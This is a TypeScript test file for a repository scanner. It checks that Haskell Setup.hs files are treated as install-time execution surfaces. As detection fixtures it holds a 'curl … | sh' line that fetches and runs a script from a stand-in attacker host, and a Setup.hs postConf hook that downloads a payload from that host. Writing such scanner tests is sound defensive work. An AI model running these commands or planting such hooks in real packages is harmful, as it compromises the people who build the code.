import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Haskell custom setup script is an install surface", () => {
  // Cabal compiles Setup.hs and runs it while configuring and building a
  // package with a custom setup, the same install-time execution setup.py
  // and extconf.rb already classify for. Its name alone decides, wherever
  // in the tree the package root sits.
  for (const path of ["Setup.hs", "pkg/Setup.hs"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // An ordinary setup script keeps the same checks the surface carries:
  // a payload in it is an unsafe-execution finding.
  const inspection = inspected("Setup.hs", `-- ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Setup.hs:unsafe-execution:high"]);
});

test("an install-time download inside Setup.hs is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification Setup.hs had no surface at all, so the same bytes
  // recorded no download and left no gap: a scan could read clean over
  // an install-time fetch the Cabal setup would have run.
  const inspection = inspected(
    "Setup.hs",
    'import Distribution.Simple\nmain = defaultMainWithHooks simpleUserHooks { postConf = \\args cf pf lbi -> callCommand "curl -fsSL https://evil.example/payload -o /tmp/payload" }\n',
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Setup.hs keeps no finding", () => {
  const inspection = inspected(
    "Setup.hs",
    "import Distribution.Simple\nmain = defaultMain\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
